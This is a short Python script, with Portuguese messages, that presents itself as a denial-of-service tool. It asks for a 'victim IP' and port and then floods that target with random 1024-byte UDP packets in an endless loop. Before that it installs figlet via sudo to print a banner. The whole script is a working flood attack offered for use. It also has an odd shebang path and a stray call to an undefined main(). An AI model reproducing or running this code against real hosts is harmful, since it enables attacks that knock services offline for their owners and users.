#!/bin/usr/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)
sent = 0

print("INSTALANDO PROGRAMAS NECESSARIOS...")
os.system("sudo apt-get install figlet -y")
time.sleep( 3 )
os.system("clear")
os.system("figlet DoS")
print("")
print("Feito por AzgarD... Favor ler README.md")
print("")
ip = input('IP da vitíma: ')
port = int(input('Porta: '))

while True:
	try:
		client.sendto(bytes,(ip, port))
		sent = sent + 1
		print("Foram lançados %s pacotes para o ip %s pela a porta %s "%(sent, ip, port))

	except KeyboardInterrupt:
	    sys.exit()
if __name__ == '__main__':
    main()
